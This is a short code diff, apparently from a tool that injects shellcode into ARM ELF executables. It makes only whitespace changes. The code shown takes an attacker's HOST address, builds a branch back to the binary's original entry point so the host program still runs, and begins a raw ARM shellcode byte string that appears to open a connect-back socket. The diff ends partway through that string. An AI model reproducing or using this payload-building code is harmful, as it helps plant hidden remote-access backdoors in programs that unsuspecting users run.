@@ -55,7 +55,7 @@ class linux_elfarmle32_shellcode():
             print "This shellcode requires a HOST parameter -H"
             sys.exit(1)
         for i, octet in enumerate(self.HOST.split('.')):
-                hostocts.append(int(octet))
+            hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                   hostocts[2], hostocts[3])
         return self.hostip
@@ -85,7 +85,7 @@ class linux_elfarmle32_shellcode():
         jmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4
         self.shellcode1 += (struct.pack("<I", jmpAddr)).strip("\x00")
         self.shellcode1 += "\xea"   #b entrypoint
-        
+
         #ACTUAL SHELLCODE
         self.shellcode1 += ("\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c\x70\xa0"
                             "\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60\xa0\xe1\x84\x10"
